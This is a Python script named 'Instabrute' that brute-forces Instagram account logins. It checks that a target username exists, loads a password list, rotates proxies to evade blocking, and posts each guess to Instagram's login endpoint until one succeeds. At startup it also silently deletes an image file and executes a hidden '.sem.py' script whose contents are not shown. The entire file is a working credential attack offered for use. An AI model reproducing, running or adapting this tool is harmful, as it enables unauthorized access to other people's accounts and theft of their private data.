#!/bin/python

import requests
import json
import time
import os
import random
import sys

# color this tool by Ahmed Ragep
os.system("rm FB_IMG_15826627876770041.jpg")
os.system("clear")
os.system("python2 .sem.py")
print ('')
print ('')
#Help function
def Input(text):
	value = ''
	if sys.version_info.major > 2:
		value = input(text)
	else:
		value = raw_input(text)
	return str(value)

#The main class
class Instabrute():
	def __init__(self, username, passwordsFile='pass.txt'):
		self.username = username
		self.CurrentProxy = ''
		self.UsedProxys = []
		self.passwordsFile = passwordsFile
		
		#Check if passwords file exists
		self.loadPasswords()
		#Check if username exists
		self.IsUserExists()


		UsePorxy = Input('\033[1;32m[*] Do you want to use proxy (y/n): ').upper()
		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
			self.randomProxy()


	#Check if password file exists and check if he contain passwords
	def loadPasswords(self):
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				self.passwords = f.read().splitlines()
				passwordsNumber = len(self.passwords)
				if (passwordsNumber > 0):
					print ('[*] %s \033[1;32mPasswords loads successfully' % passwordsNumber)
				else:
					print('\033[1;31mPassword file are empty, Please add passwords ')
					Input('[*] \033[1;33mPress enter to exit')
					exit()
		else:
			print ('\033[1;34mPlease create passwords file named "%s"' % self.passwordsFile)
			Input('\033[1;33m[*] Press enter to exit')
			exit()

	#Choose random proxy from proxys file
	def randomProxy(self):
		plist = open('proxy.txt').read().splitlines()
		proxy = random.choice(plist)

		if not proxy in self.UsedProxys:
			self.CurrentProxy = proxy
			self.UsedProxys.append(proxy)
		try:
			print('')
			print('\033[1;31m[*] Check new ip...')
			print ('[*] \033[1;32mYour public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https":
proxy },timeout=10.0).text)
		except Exception as e:
			print  ('[*] \033[1;31mCan\'t reach proxy "%s"' % proxy)
		print('')


	#Check if username exists in instagram server
	def IsUserExists(self):
		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
		if (r.status_code == 404):
			print ('[*] \033[1;31mUser named "%s" not found' % username)
			Input('[*] \033[1;34mPress enter to exit')
			exit()
		elif (r.status_code == 200):
			return True

	#Try to login with password
	def Login(self, password):
		sess = requests.Session()

		if len(self.CurrentProxy) > 0:
			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }

		#build requests headers
		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		sess.headers.update({
			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})

		#Update token after enter to the site
		r = sess.get('https://www.instagram.com/') 
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

		#Update token after login to the site 
		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
		
		#parse response
		data = json.loads(r.text)
		if (data['status'] == 'fail'):
			print (data['\033[1;32mmessage'])

			UsePorxy = Input('[*] \033[1;33mDo you want to use proxy (y/n): ').upper()
			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
				print ('[$] \033[1;31mTry to use proxy after fail.')
				randomProxy() #Check that, may contain bugs
			return False

		#return session if password is correct 
		if (data['authenticated'] == True):
			return sess 
		else:
			return False






instabrute = Instabrute(Input('\033[1;32mPlease enter a username:~# '))

try:
	delayLoop = int(Input('[*] \033[1;33mPlease add numper the bruteforce action (in seconds): ')) 
except Exception as e:
	print ('[*] \033[1;31mError, software use the defult value "4"')
	delayLoop = 4
print ('')



for password in instabrute.passwords:
	sess = instabrute.Login(password)
	if sess:
		print ('\033[1;32m[*] Login success %s' % [instabrute.username,password])
	else:
		print ('\033[1;31m[*] Password incorrect [%s]' % password)

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		WantToExit = str(Input('\033[1;34mType y/n to exit: ')).upper()
		if (WantToExit == 'Y' or WantToExit == 'YES'):
			exit()
		else:
			continue
		
